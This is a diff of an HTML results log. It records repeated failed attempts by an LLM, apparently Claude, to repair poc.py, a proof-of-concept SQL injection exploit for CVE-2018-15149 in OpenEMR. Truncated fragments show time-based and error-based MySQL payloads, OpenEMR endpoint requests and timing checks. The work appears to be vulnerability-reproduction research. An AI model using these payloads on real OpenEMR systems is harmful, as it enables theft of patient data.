-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 17:36:57</td><td>M3 PoC Fix</td><td class="center">7</td><td class="center mono">5b2fb6cc</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 17:36:57</td><td>M3 PoC Fix</td><td class="center">7</td><td class="center mono">5b2fb6cc</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -55,48 +55,58 @@ def test_sqli(session, target, site, delay=3):
@@ -757,7 +758,7 @@ Here&#x27;s the fix:
 -        f&quot;1&#x27; AND BENCHMARK(5000000,SHA1(&#x27;test&#x27;))-- -&quot;,
 -        f&quot;1; SELECT SLEEP({delay});-- -&quot;,
 +    # Boolean-based payloads for detectio</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 17:37:43</td><td>M3 PoC Fix</td><td class="center">8</td><td class="center mono">5b2fb6cc</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 17:37:43</td><td>M3 PoC Fix</td><td class="center">8</td><td class="center mono">5b2fb6cc</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -54,17 +54,14 @@ def test_sqli(session, target, site, delay=3):
@@ -807,7 +808,7 @@ Here&#x27;s the fix:
 -    # Test each endpoint with each payload
 +    # Test each endpoint with each payload and action
      for endpoint in vuln_e</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 17:38:59</td><td>M3 PoC Fix</td><td class="center">9</td><td class="center mono">5b2fb6cc</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 17:38:59</td><td>M3 PoC Fix</td><td class="center">9</td><td class="center mono">5b2fb6cc</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 Looking at this CVE-2018-15149 PoC, the issue is that the endpoints being tested may not exist or the injection parameters aren&#x27;t reaching the vulnerable `getProviderIdOfEncounter()` function. I need to try different endpoints and parameter names that are more likely to exist in a default OpenEMR installation and trigger the vulnerable code path.
 
 --- a/poc.py
@@ -847,7 +848,7 @@ Looking at this CVE-2018-15149 PoC, the issue is that the endpoints being tested
      print(f&quot;[*] Testing time-based SQL injection with {delay}s delay...&quot;)
 @@ -89,31 +97,58 @@ def test_sqli(session, target, site, delay=3):
      # First establish a patient/encounter context</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 17:39:34</td><td>M3 PoC Fix</td><td class="center">10</td><td class="center mono">5b2fb6cc</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 17:39:34</td><td>M3 PoC Fix</td><td class="center">10</td><td class="center mono">5b2fb6cc</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -64,14 +64,17 @@ def test_sqli(session, target, site, delay=3):
@@ -902,7 +903,7 @@ Looking at this CVE-2018-15149 PoC, the issue is that the endpoints being tested
 -                elapsed = time.time() - start_time
 +                try:
 +                    s</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 17:40:40</td><td>M3 PoC Fix</td><td class="center">11</td><td class="center mono">5b2fb6cc</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 17:40:40</td><td>M3 PoC Fix</td><td class="center">11</td><td class="center mono">5b2fb6cc</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -54,17 +54,21 @@ def test_sqli(session, target, site, delay=3):
@@ -947,7 +948,7 @@ Looking at this CVE-2018-15149 PoC, the issue is that the endpoints being tested
          ctx_url = urljoin(target, &quot;/interface/patient_file/summary/demographics.php&quot;)
 -        session.get(ctx_url, params={&quot;set_pid&quot;: &quot;1&quot;}, verify=False, timeout=10)
 +        resp = sess</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 17:41:28</td><td>M3 PoC Fix</td><td class="center">12</td><td class="center mono">5b2fb6cc</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 17:41:28</td><td>M3 PoC Fix</td><td class="center">12</td><td class="center mono">5b2fb6cc</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -53,14 +53,17 @@ def test_sqli(session, target, site, delay=3):
@@ -999,7 +1000,7 @@ Looking at this CVE-2018-15149 PoC, the issue is that the endpoints being tested
                  continue
          except:
 @@ -110,7 +117,7 @@ def test_sqli(se</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 17:42:09</td><td>M3 PoC Fix</td><td class="center">13</td><td class="center mono">5b2fb6cc</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 17:42:09</td><td>M3 PoC Fix</td><td class="center">13</td><td class="center mono">5b2fb6cc</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -57,13 +57,16 @@ def test_sqli(session, target, site, delay=3):
@@ -1050,7 +1051,7 @@ Looking at this CVE-2018-15149 PoC, the issue is that the endpoints being tested
          try:
              check = session.get(vuln_url, params={&quot;encounter&quot;: &quot;1&quot;, &quot;pid&quot;: &quot;1&quot;}, verify=False, timeout=10)
 @@ -107,</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 17:43:08</td><td>M3 PoC Fix</td><td class="center">14</td><td class="center mono">5b2fb6cc</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 17:43:08</td><td>M3 PoC Fix</td><td class="center">14</td><td class="center mono">5b2fb6cc</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 Looking at this PoC, the issue is that the SQL injection isn&#x27;t being triggered because:
 1. The eye_mag module endpoints may not exist in the default installation
 2. The payloads need IF-based conditionals for more reliable MySQL time-based injection
@@ -1094,7 +1095,7 @@ Looking at this PoC, the issue is that the SQL injection isn&#x27;t being trigge
 -        session.get(ctx_url, params={&quot;set_pid&quot;: &quot;1&quot;}, verify=False, timeout=10)
 -    except:
 +        resp = session.get(ctx_url, params</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 18:52:25</td><td>M3 PoC Fix</td><td class="center">1</td><td class="center mono">5b2fb6cc</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 18:52:25</td><td>M3 PoC Fix</td><td class="center">1</td><td class="center mono">5b2fb6cc</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -61,6 +61,15 @@ def test_sqli(session, target, site, delay=3):
@@ -1154,7 +1155,7 @@ Looking at this PoC, the issue is that the SQL injection isn&#x27;t being trigge
          vuln_url = urljoin(target, endpoint)
          for payload in payloads:
              data = {&quot;encounter&quot;: payloa</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 18:53:01</td><td>M3 PoC Fix</td><td class="center">2</td><td class="center mono">5b2fb6cc</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 18:53:01</td><td>M3 PoC Fix</td><td class="center">2</td><td class="center mono">5b2fb6cc</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -56,15 +56,17 @@ def test_sqli(session, target, site, delay=3):
@@ -1207,7 +1208,7 @@ Looking at this PoC, the issue is that the SQL injection isn&#x27;t being trigge
 +                try:
 +                    start_time = time.time()
 +                    resp = session.get(vuln_url, params=params, headers=ajax_he</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 18:53:37</td><td>M3 PoC Fix</td><td class="center">3</td><td class="center mono">e7a9c5db</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 18:53:37</td><td>M3 PoC Fix</td><td class="center">3</td><td class="center mono">e7a9c5db</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -56,15 +56,16 @@ def test_sqli(session, target, site, delay=3):
@@ -1263,7 +1264,7 @@ Looking at this PoC, the issue is that the SQL injection isn&#x27;t being trigge
          vuln_url = urljoin(target, endpoint)
  
          # Check if</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 18:54:08</td><td>M3 PoC Fix</td><td class="center">4</td><td class="center mono">cf8353fd</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 18:54:08</td><td>M3 PoC Fix</td><td class="center">4</td><td class="center mono">cf8353fd</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -63,6 +63,13 @@ def test_sqli(session, target, site, delay=3):
@@ -1310,8 +1311,8 @@ Looking at this PoC, the issue is that the SQL injection isn&#x27;t being trigge
 +                    return True, payload, delay
 +                except requests.RequestException:
 +                    contin</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 18:54:10</td><td>M3 PoC Fix</td><td class="center">5</td><td class="center mono">cf8353fd</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>claude CLI error: `claude` CLI exited with code 1. stderr:</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 19:07:24</td><td>M3 PoC Fix</td><td class="center">1</td><td class="center mono">cf8353fd</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 18:54:10</td><td>M3 PoC Fix</td><td class="center">5</td><td class="center mono">cf8353fd</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>claude CLI error: `claude` CLI exited with code 1. stderr:</td><td><span class="muted">—</span></td></tr>
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 19:07:24</td><td>M3 PoC Fix</td><td class="center">1</td><td class="center mono">cf8353fd</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -56,17 +56,6 @@ def test_sqli(session, target, site, delay=3):
@@ -1370,7 +1371,7 @@ Looking at this PoC, the issue is that the SQL injection isn&#x27;t being trigge
 +                    params[&quot;action&quot;] = action
  
 -</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 19:07:53</td><td>M3 PoC Fix</td><td class="center">2</td><td class="center mono">cf8353fd</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 19:07:53</td><td>M3 PoC Fix</td><td class="center">2</td><td class="center mono">cf8353fd</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -56,12 +56,18 @@ def test_sqli(session, target, site, delay=3):
@@ -1418,7 +1419,7 @@ Looking at this PoC, the issue is that the SQL injection isn&#x27;t being trigge
      for endpoint in vuln_endpoints:
 -        if &quot;404&quot; in str(session.get(urljoin(target, endpoint), verify=False, timeout=5).status_code):
 -            continue</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 19:08:21</td><td>M3 PoC Fix</td><td class="center">3</td><td class="center mono">cf8353fd</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 19:08:21</td><td>M3 PoC Fix</td><td class="center">3</td><td class="center mono">cf8353fd</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -56,6 +56,7 @@ def test_sqli(session, target, site, delay=3):
@@ -1464,7 +1465,7 @@ Looking at this PoC, the issue is that the SQL injection isn&#x27;t being trigge
      print(&quot;[*] Trying error-based SQL injection...&quot;)
      for endpoint in vuln_endpoints:
 -        if &quot;404&quot; in str(session.get(urljoin(target, endpoint), verify=False, timeout=5).status_code):</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 19:08:59</td><td>M3 PoC Fix</td><td class="center">4</td><td class="center mono">cf8353fd</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 19:08:59</td><td>M3 PoC Fix</td><td class="center">4</td><td class="center mono">cf8353fd</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -56,30 +56,28 @@ def test_sqli(session, target, site, delay=3):
@@ -1521,7 +1522,7 @@ Looking at this PoC, the issue is that the SQL injection isn&#x27;t being trigge
 +    set_pid_url = urljoin(target, &quot;/interface/patient_file/summary/demographics.php&quot;)
      try:
 -        ctx_url = urljoin(target, &quot;/interface/p</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 19:10:03</td><td>M3 PoC Fix</td><td class="center">5</td><td class="center mono">cf8353fd</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 19:10:03</td><td>M3 PoC Fix</td><td class="center">5</td><td class="center mono">cf8353fd</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -54,12 +54,15 @@ def test_sqli(session, target, site, delay=3):
@@ -1579,7 +1580,7 @@ Looking at this PoC, the issue is that the SQL injection isn&#x27;t being trigge
          baseline_url = urljoin(target, &quot;/interface/main/tabs/main.php&quot;)
          start = time.time()
          session.get(baseline_url, verify=False, timeout=10)</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 19:11:09</td><td>M3 PoC Fix</td><td class="center">6</td><td class="center mono">cf8353fd</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 19:11:09</td><td>M3 PoC Fix</td><td class="center">6</td><td class="center mono">cf8353fd</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -58,9 +58,11 @@ def test_sqli(session, target, site, delay=3):
@@ -1626,7 +1627,7 @@ Looking at this PoC, the issue is that the SQL injection isn&#x27;t being trigge
 +        check_resp = session.get(eye_mag_check, verify=False, timeout=10)
 +        if check_resp.status_code == 404:
 +</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 19:11:43</td><td>M3 PoC Fix</td><td class="center">7</td><td class="center mono">48cd9af6</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 19:11:43</td><td>M3 PoC Fix</td><td class="center">7</td><td class="center mono">48cd9af6</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -56,6 +56,7 @@ def test_sqli(session, target, site, delay=3):
@@ -1675,7 +1676,7 @@ Looking at this PoC, the issue is that the SQL injection isn&#x27;t being trigge
 +                elapsed = time.time() - start_time
 +
 +</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 19:12:24</td><td>M3 PoC Fix</td><td class="center">8</td><td class="center mono">48cd9af6</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 19:12:24</td><td>M3 PoC Fix</td><td class="center">8</td><td class="center mono">48cd9af6</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -56,13 +56,6 @@ def test_sqli(session, target, site, delay=3):
@@ -1732,7 +1733,7 @@ Looking at this PoC, the issue is that the SQL injection isn&#x27;t being trigge
  
 -        # Check if endpoint exists first
 -        endpoint_basel</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 19:13:06</td><td>M3 PoC Fix</td><td class="center">9</td><td class="center mono">48cd9af6</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 19:13:06</td><td>M3 PoC Fix</td><td class="center">9</td><td class="center mono">48cd9af6</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -57,18 +57,20 @@ def test_sqli(session, target, site, delay=3):
@@ -1787,7 +1788,7 @@ Looking at this PoC, the issue is that the SQL injection isn&#x27;t being trigge
 @@ -96,9 +100,16 @@ def test_sqli(session, target, site, delay=3):
  
      # First establish</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 19:13:52</td><td>M3 PoC Fix</td><td class="center">10</td><td class="center mono">12d9e42e</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 19:13:52</td><td>M3 PoC Fix</td><td class="center">10</td><td class="center mono">12d9e42e</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -56,6 +56,7 @@ def test_sqli(session, target, site, delay=3):
@@ -1836,7 +1837,7 @@ Looking at this PoC, the issue is that the SQL injection isn&#x27;t being trigge
 +                    return True, payload, elapsed
 +                    
 +            except requests.Timeout:
-+                print(f&quot;[+] SQLi CONFIRMED! Request timed<hr class="sep"><span class="lbl-fix">CHANGES MADE</span><br>--- a/poc.py
++                print(f&quot;[+] SQLi CONFIRMED! Request timed<hr class="sep"><span class="lbl-fix">Changes made</span><br>--- a/poc.py
 +++ b/poc.py
 @@ -56,6 +56,7 @@ def test_sqli(session, target, site, delay=3):
      &quot;&quot;&quot;
@@ -1875,7 +1876,7 @@ Looking at this PoC, the issue is that the SQL injection isn&#x27;t being trigge
 +    # The vulnerable function getProviderIdOfEncounter is called via AJAX
 +    for action in [&quot;get_PRIOR&quot;, &quot;retrieve&quot;, &quot;get_allMissing&quot;]:
 +        for payload</pre></details></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 19:14:49</td><td>M3 PoC Fix</td><td class="center">11</td><td class="center mono">12d9e42e</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 19:14:49</td><td>M3 PoC Fix</td><td class="center">11</td><td class="center mono">12d9e42e</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -61,10 +61,12 @@ def test_sqli(session, target, site, delay=3):
@@ -1922,7 +1923,7 @@ Looking at this PoC, the issue is that the SQL injection isn&#x27;t being trigge
 +            
 +            if elapsed &gt;= delay * 0.7:
 +                print(f&quot;[+] SQLi C</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 19:15:31</td><td>M3 PoC Fix</td><td class="center">12</td><td class="center mono">12d9e42e</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 19:15:31</td><td>M3 PoC Fix</td><td class="center">12</td><td class="center mono">12d9e42e</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -63,6 +63,8 @@ def test_sqli(session, target, site, delay=3):
@@ -1976,7 +1977,7 @@ Looking at this PoC, the issue is that the SQL injection isn&#x27;t being trigge
 +            
 +            # If responses differ significantly, injection is working
 +            if resp_true.status_code != 404 and resp_false.status_code !=</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 19:16:05</td><td>M3 PoC Fix</td><td class="center">13</td><td class="center mono">12d9e42e</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 19:16:05</td><td>M3 PoC Fix</td><td class="center">13</td><td class="center mono">12d9e42e</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -60,6 +60,10 @@ def test_sqli(session, target, site, delay=3):
@@ -2026,7 +2027,7 @@ Looking at this PoC, the issue is that the SQL injection isn&#x27;t being trigge
 +            elapsed = time.time() - start_time
 +            if elapsed &gt;= delay * 0.8:
 +                print(f&quot;[+] SQLi CONFIRMED! R</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 19:16:37</td><td>M3 PoC Fix</td><td class="center">14</td><td class="center mono">6fd082aa</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 19:16:37</td><td>M3 PoC Fix</td><td class="center">14</td><td class="center mono">6fd082aa</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -74,14 +74,14 @@ def test_sqli(session, target, site, delay=3):
@@ -2075,7 +2076,7 @@ Looking at this PoC, the issue is that the SQL injection isn&#x27;t being trigge
 -        f&quot;1 AND SLEEP({delay})-- -&quot;,
 -        f&quot;1&#x27; OR SLEEP({delay})-- -&quot;,
 -        f&quot;1&#x27; AND BENCHMARK(5000000,SHA1(&#x27;test&#x27;))-- -&quot;,
--        f&quot;1; SELECT SLEE<hr class="sep"><span class="lbl-fix">CHANGES MADE</span><br>--- a/poc.py
+-        f&quot;1; SELECT SLEE<hr class="sep"><span class="lbl-fix">Changes made</span><br>--- a/poc.py
 +++ b/poc.py
 @@ -74,14 +74,14 @@ def test_sqli(session, target, site, delay=3):
      ]
@@ -2122,7 +2123,7 @@ Looking at this PoC, the issue is that the SQL injection isn&#x27;t being trigge
 @@ -200,6 +200,8 @@ def test_sqli(session, target, site, delay=3):
      error_payloads = [
          &quot;1&#x27; AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version</pre></details></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 19:18:05</td><td>M3 PoC Fix</td><td class="center">15</td><td class="center mono">6fd082aa</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 19:18:05</td><td>M3 PoC Fix</td><td class="center">15</td><td class="center mono">6fd082aa</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -62,6 +62,10 @@ def test_sqli(session, target, site, delay=3):
@@ -2177,7 +2178,7 @@ Looking at this PoC, the issue is that the SQL injection isn&#x27;t being trigge
 +    # Try setting encounter via forms.php
 +    try:
 +        forms_url = urljoin(targe</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 19:18:56</td><td>M3 PoC Fix</td><td class="center">16</td><td class="center mono">6fd082aa</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 19:18:56</td><td>M3 PoC Fix</td><td class="center">16</td><td class="center mono">6fd082aa</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -58,12 +58,15 @@ def test_sqli(session, target, site, delay=3):
@@ -2233,7 +2234,7 @@ Looking at this PoC, the issue is that the SQL injection isn&#x27;t being trigge
      print(f&quot;[*] Testing time-based SQL injection with {delay}s delay...&quot;)
  
 -</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 19:19:41</td><td>M3 PoC Fix</td><td class="center">17</td><td class="center mono">6fd082aa</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 19:19:41</td><td>M3 PoC Fix</td><td class="center">17</td><td class="center mono">6fd082aa</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -58,6 +58,7 @@ def test_sqli(session, target, site, delay=3):
@@ -2278,7 +2279,7 @@ Looking at this PoC, the issue is that the SQL injection isn&#x27;t being trigge
 +            if elapsed &gt;= delay * 0.7:
